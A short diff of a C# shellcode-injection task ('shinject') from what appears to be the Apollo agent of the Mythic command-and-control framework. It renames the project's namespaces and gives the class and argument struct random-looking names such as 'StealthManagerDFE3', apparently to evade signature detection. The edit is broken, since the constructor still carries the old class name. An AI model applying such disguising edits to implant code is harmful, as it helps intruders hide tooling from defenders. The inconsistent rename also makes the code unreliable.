@@ -6,25 +6,25 @@
 
 #if SHINJECT
 
-using ApolloInterop.Classes;
-using ApolloInterop.Interfaces;
-using ApolloInterop.Structs.MythicStructs;
+using PhantomInterop.Classes;
+using PhantomInterop.Interfaces;
+using PhantomInterop.Structs.MythicStructs;
 using System.Runtime.InteropServices;
 using System.Runtime.Serialization;
 
 namespace Tasks
 {
-    public class shinject : Tasking
+    public class PhantomCoordinator81CC : Tasking
     {
         [DataContract]
-        internal struct ShinjectArguments
+        internal struct StealthManagerDFE3
         {
             [DataMember(Name = "pid")]
             public int PID;
             [DataMember(Name = "shellcode-file-id")]
             public string Shellcode;
         }
-        public shinject(IAgent agent, ApolloInterop.Structs.MythicStructs.MythicTask data) : base(agent, data)
+        public shinject(IAgent agent, PhantomInterop.Structs.MythicStructs.MythicTask data) : base(agent, data)
         {
         }
 
